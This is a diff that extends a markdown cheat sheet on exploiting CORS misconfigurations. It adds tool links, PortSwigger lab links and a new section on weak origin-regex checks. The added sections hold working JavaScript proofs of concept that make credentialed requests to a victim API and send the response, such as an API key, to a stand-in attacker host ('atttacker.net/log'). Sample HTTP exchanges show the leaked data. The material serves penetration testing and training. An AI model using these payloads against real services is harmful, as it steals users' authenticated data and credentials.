@@ -11,8 +11,11 @@
 
 ## Tools
 
-* [Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy/)
+* [s0md3v/Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy/)
+* [chenjj/CORScanner - Fast CORS misconfiguration vulnerabilities scanner](https://github.com/chenjj/CORScanner)
 * [PostMessage POC Builder - @honoki](https://tools.honoki.net/postmessage.html)
+* [trufflesecurity/of-cors - Exploit CORS misconfigurations on the internal networks](https://github.com/trufflesecurity/of-cors) 
+
 
 ## Prerequisites
 
@@ -22,7 +25,7 @@
 
 ## Exploitation
 
-Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target **https://victim.example.com/endpoint**.
+Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.
 
 ### Vulnerable Example: Origin Reflection
 
@@ -42,6 +45,8 @@ Access-Control-Allow-Credentials: true
 ```
 
 #### Proof of concept
+
+This PoC requires that the respective JS script is hosted at `evil.com`
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -111,7 +116,7 @@ origin in the request:
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
-  var req = new XMLHttpRequest ();
+  var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://victim.example.com/endpoint',true);
   req.withCredentials = true;
@@ -173,6 +178,82 @@ function reqListener() {
 };
 ```
 
+### Vulnerable Example: Expanding the Origin / Regex Issues
+Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
+
+#### Vulnerable Implementation (Example 1)
+
+In this scenario any prefix inserted in front of `example.com` will be accepted by the server. 
+
+```
+GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://evilexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evilexample.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+
+```
+
+#### Proof of concept (Example 1)
+
+This PoC requires the respective JS script to be hosted at `evilexample.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
+```
+
+#### Vulnerable Implementation (Example 2)
+
+In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+
+```
+GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://apiiexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://apiiexample.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+
+```
+
+#### Proof of concept (Example 2)
+
+This PoC requires the respective JS script to be hosted at `apiiexample.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
+```
+
+## Labs
+
+* [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+* [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+* [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+* [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
+
 ## Bug Bounty reports
 
 * [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)](https://hackerone.com/reports/168574)
@@ -188,3 +269,4 @@ function reqListener() {
 * [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
 * [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://www.corben.io/advanced-cors-techniques/)
 * [PortSwigger Web Security Academy: CORS](https://portswigger.net/web-security/cors)
+* [CORS Misconfigurations Explained - Detectify Blog](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
